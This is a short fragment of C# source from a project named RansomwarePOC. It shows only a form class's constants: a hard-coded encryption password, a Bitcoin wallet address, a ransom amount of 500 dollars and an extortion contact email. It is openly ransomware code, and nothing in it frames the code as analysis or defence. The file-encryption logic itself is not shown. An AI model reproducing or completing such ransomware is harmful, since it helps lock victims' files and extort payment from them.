...
namespace RansomwarePOC
{
    public partial class Form1 : Form
    {
        ...
        private const string ENCRYPT_PASSWORD = "LizzarD74!@!@!@";
        private const string BITCOIN_ADDRESS = "bc1qze8m8jwl0q3cy3xp8kghl5g5mwsydtq6e4l4jh";
        private const string BITCOIN_RANSOM_AMOUNT = "500$";
        private const string EMAIL_ADDRESS = "vendettamafia@shenron.su";
